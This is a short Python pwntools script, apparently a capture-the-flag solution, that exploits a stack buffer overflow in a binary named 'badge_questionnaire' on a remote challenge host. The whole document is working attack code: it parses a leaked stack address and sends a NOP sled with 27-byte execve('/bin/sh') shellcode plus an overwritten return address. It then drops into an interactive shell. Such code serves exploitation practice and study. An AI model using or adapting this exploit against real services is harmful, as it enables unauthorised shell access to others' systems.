from pwn import *

elf = ELF("./badge_questionnaire")
p = process("./badge_questionnaire")
p = remote("jump.chrononaut.xyz", 5001)

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" # 27 bytes

char_limit_address = (p.recvuntil(b")").split(b"(")[1]).split(b" ")[0].decode()
print(char_limit_address)

payload = b"\x90"*53 + shellcode + b"\x90"*40 + p64(int(char_limit_address, 16) - 100)
size_in_bytes = len(payload)
print(size_in_bytes)
print(payload)

p.sendline(payload)
p.interactive()
